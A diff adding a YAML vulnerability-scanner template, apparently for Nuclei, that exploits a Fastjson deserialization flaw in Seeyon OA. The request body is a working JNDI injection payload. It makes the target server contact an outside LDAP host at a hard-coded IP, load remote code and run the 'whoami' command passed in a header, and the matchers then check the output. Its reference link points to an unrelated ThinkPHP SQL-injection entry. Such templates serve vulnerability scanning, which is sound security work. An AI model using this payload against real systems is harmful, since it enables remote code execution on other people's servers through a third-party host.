@@ -1,0 +1,29 @@
+id: seeyon_fastjson-rce
+
+info:
+  name: Seeyon-fastjson-rce
+  author: wintrysec
+  severity: critical
+  description: 致远OA_Fastjson反序列化远程命令执行.
+  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/in-sqlinjection
+  tags: seeyon
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/seeyon/sursenServlet"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      cmd: whoami
+    body: 'sursenData={"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://212.129.244.167:1389/TomcatBypass/TomcatEcho","autoCommit":"true"}}'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root"
+          - "administrator"
+          - "system"
+        condition: or
+      - type: status
+        status:
+          - 200
